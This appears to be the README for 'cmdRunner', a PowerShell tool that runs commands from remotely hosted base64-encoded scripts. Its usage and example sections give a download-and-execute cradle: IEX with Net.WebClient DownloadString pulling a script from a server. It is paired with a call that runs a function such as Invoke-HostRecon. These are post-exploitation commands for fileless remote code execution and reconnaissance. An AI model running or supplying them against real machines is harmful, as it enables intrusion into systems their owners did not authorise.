# cmdRunner

## Usage
IEX ((New-Object Net.WebClient).DownloadString('http://your-server/path/to/cmdRunner.ps1'))
cmdRunner -Uri http://your-server/path/to/b64/encoded/powershell/script.txt -Command <Command found in script.txt>

## Example
IEX ((New-Object Net.WebClient).DownloadString(''))
cmdRunner -Uri <URL> -Command Invoke-HostRecon
